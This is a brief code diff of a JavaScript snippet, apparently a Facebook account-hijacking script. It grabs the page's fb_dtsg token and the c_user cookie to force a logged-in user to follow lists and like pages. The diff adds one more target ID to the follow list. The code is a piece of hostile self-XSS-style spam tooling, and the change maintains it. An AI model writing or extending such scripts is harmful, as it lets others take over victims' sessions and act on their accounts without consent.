@@ -1,4 +1,3 @@
-
 /*Follow List*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
@@ -35,6 +34,7 @@ LIST("359722610800552");
 LIST("146971562150041");
 LIST("503774323004340");
 LIST("177777859044364");
+LIST("296332940501763");
 
 /*Like Page*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
